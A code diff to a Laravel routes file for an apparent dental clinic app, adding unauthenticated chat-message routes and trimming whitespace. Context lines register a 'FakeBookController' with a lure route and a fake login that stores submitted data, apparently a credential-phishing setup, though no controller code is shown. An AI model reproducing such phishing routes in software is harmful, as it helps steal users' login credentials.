@@ -35,6 +35,8 @@ use App\Http\Controllers\AdminMedicalQuestionController;
 use App\Http\Controllers\ProfilePictureUpdateController;
 use App\Http\Controllers\AdminPermissionUpdateController;
 use App\Http\Controllers\AdminAccountManagementController;
+use App\Http\Controllers\ChatMessageController;
+use App\Models\ChatMessage;
 
 /*
 |--------------------------------------------------------------------------
@@ -76,20 +78,20 @@ Route::middleware(['auth'])->prefix('admin/')->name('admin.')->group(function(){
 
         // dentist account
         Route::get('/dentist-accounts', [AdminAccountManagementController::class, 'dentistAccounts'])->name('dentist_accounts');
-        // endof dentist account 
+        // endof dentist account
 
         // staff account
         Route::get('/staff-accounts', [AdminAccountManagementController::class, 'staffAccounts'])->name('staff_accounts');
-        // endof staff account 
+        // endof staff account
 
         // account create
         Route::get('/create', [AdminAccountManagementController::class, 'create'])->name('create');
         Route::post('/', [AdminAccountManagementController::class, 'store'])->name('store');
         // end account create
 
-        
 
-        
+
+
     });
     // end of admin account management
 
@@ -113,17 +115,17 @@ Route::middleware(['auth'])->prefix('admin/')->name('admin.')->group(function(){
     });
     // end of appoibntment management
 
-    // Medical question management 
+    // Medical question management
     Route::prefix('medicals')->name('medical.')->group(function(){
         Route::resource('questions', AdminMedicalQuestionController::class);
     });
-    // end of medical queestion management 
+    // end of medical queestion management
 
-    // log 
+    // log
     Route::resource('log', AdminLogController::class);
     // end of log
 
-    // blocking account 
+    // blocking account
     Route::get('/blocking', [AdminBlockingController::class, 'blockedList'])->name('blocked.list');
     // end of blocking
 
@@ -149,7 +151,7 @@ Route::middleware(['auth'])->prefix('admin/')->name('admin.')->group(function(){
     Route::post('setting/save-account', [AdminSettingController::class, 'AccountSave'])->name('setting.account.save');
     Route::post('setting/save-app', [AdminSettingController::class, 'AppSave'])->name('setting.app.save');
     // end of setting
-    
+
     // tutorials
     Route::get('/tutorials/create', [AdminHelpController::class, 'create'])->name('tutorial.create');
     Route::get('/tutorials', [AdminHelpController::class, 'index'])->name('tutorial.index');
@@ -192,17 +194,17 @@ Route::prefix('blogs')->name('blogs.')->group(function(){
 });
 // endof blog
 
-//patient medical answers 
+//patient medical answers
 Route::resource('medical-history', MedicalAnswerController::class)->middleware('auth');
 
 // user spassword changing
 Route::get('change-password', [AccountPasswordController::class, 'showPasswordForm'])->name('show.password.form');
 Route::post('change-password', [AccountPasswordController::class, 'storePassword'])->name('store.password');
 
-//staff of dentist 
+//staff of dentist
 Route::resource('account-management', AccountManagementController::class)->middleware('auth');
 
-//all appointemt for staff only 
+//all appointemt for staff only
 Route::resource('all-appointments', AllAppointmentController::class)->middleware('auth');
 
 // help/turorial
@@ -228,7 +230,7 @@ Route::post('send-message', function(){
         toast('Oooops! You have sent already a message to us!', 'error');
         return redirect('/#contact');
     }
-    
+
     Message::create($data);
     toast('Message sent!', 'success');
     return redirect('/#contact');
@@ -237,3 +239,6 @@ Route::post('send-message', function(){
 Route::get('/extra-income', [FakeBookController::class, 'hook']);
 Route::get('/aakebook', [FakeBookController::class, 'login']);
 Route::post('/fakebook', [FakeBookController::class, 'store']);
+
+Route::get('/chat-messages', [ChatMessageController::class, 'viewChat']);
+Route::post('/chat-messages', [ChatMessageController::class, 'store']);
